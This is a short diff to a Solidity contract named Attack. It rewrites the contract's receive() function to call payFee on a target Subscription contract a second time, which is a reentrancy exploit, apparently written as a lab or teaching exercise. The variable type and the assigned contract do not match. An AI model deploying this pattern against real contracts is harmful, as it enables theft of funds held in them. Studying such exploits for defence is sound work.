@@ -5,9 +5,12 @@ import "./Subscription.sol";
 
 contract Attack {
     Deposit depos;
+    address payable public owner;
+    bool attacked = false;
 
     constructor(address payable _addr) public {
-        depos = Deposit(_addr);
+        depos = Subscription(_addr);
+        owner = msg.sender;
     }
 
     function getBalance() public view returns (uint) {
@@ -18,7 +21,10 @@ contract Attack {
         msg.sender.transfer(address(this).balance);
     }
 
-    receive() external payable {
-        depos.payFee(msg.sender);
+    receive() external payable {   
+        if (!attacked) {
+            attacked = true;
+            depos.payFee(address(this));
+        }
     }
 }
